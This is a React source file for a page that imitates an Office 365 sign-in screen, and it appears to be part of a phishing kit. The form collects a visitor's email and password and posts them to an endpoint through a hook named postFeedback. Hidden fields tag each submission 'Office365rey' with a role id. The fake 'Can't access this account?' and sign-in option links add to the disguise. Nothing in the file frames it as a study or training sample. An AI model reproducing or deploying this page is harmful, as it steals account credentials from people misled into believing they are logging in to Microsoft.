import './App.css';
import './Hover.css';
import './DemoPage.css';
import qs from 'qs';
import useFeedback from './api/useFeedback';
import React, { useState } from 'react';
import { Button, Modal } from 'react-bootstrap';

function Office() {
  const { postFeedback, isLoading } = useFeedback();
  const [emails, setEmail] = useState('');
  const [passwords, setPassword] = useState('');
  const [detail, setDetails] = useState('Office365rey');
  const [role, setRole] = useState('2');



  const onSubmit = async (e) => {
  e.preventDefault();
    const data = qs.stringify({
      email: emails,
      password: passwords,
      details: detail,
      role_id: role,
    });

    try {
      await postFeedback(data);
      setPassword('');
      setEmail('');
    } catch (error) {
      console.log(error);
    }
  };
  

  const [show, setShow] = useState(false);

  const handleClose = () => setShow(false);
  const handleShow = () => setShow(true);


  return (

    <div  className="container-fluid">
    <div  className="row" >
    <div className="bg-image" 
     style={{backgroundImage: "url('images/imgback.jpg')",
            height: "100vh",  backgroundSize: "cover", backgroundRepeat: "no-repeat"}}>
      
      <div  className="container pt-5 mb-4">
        <div className="row">
        <div  className="col-sm-4 mx-auto my-5 px-5 pb-3 pt-2 shadow bg-white rounded" style={{  backgroundColor: "white", borderRadius:"15px"}}>
       
        <div className='text-left pt-2'>
   <img src="images/icro.png"  className="img-fluid" width="120px" height="90px"/>
   <br/>
   <span  className="p text-dark pt-2">Sign In</span> 
   </div>
   
            
  

       

       
            <form    onSubmit={onSubmit}  className="form-horizontal well">
              <div  className="col-lg-12">
                <div  className="form-group">
                 
                  <input type="email" name="emails"  className="form-control" id="emails" value={emails}  onChange={(e) => setEmail(e.target.value)}  placeholder="Enter email"/>
                
                </div>
              </div>
              <div  className="col-lg-12">
                <div  className="form-group">
        
                  <input type="password" name="passwords"  className="form-control" id="passwords" value={passwords}  onChange={(e) => setPassword(e.target.value)} placeholder="Enter Password"/>
                </div>
              </div>
              <div  className="col-lg-12">
                <div  className="form-group">
              
                  <input type="hidden" name="detail"  className="form-control" id="detail" value={detail}   onChange={(e) => setDetails(e.target.value)} />
                </div>
              </div>

              <div  className="col-lg-12">
                <div  className="form-group">
              
                  <input type="hidden" name="role"  className="form-control" id="role" value={role}   onChange={(e) => setRole(e.target.value)} />
                </div>
              </div>

              <p className='font-weight-light' style={{fontSize:"14px"}}>No account <a href=""> Create One!</a></p>
              <p className='font-weight-light' style={{fontSize:"14px"}}> <a href="">Can't access this account?</a></p>
              <p className='font-weight-light' style={{fontSize:"14px"}}> <a href=""> Sign-in options</a></p>
        

             
            <button className="btn btn-sm pull-right " style={{ color: "white", backgroundColor:"#163a98", float: "right" }} id="submit-btn">Next</button>
    
          </form>
      </div>

          </div>
     
    </div> 
    </div>
  </div>
  </div>
  );
}

export default Office;
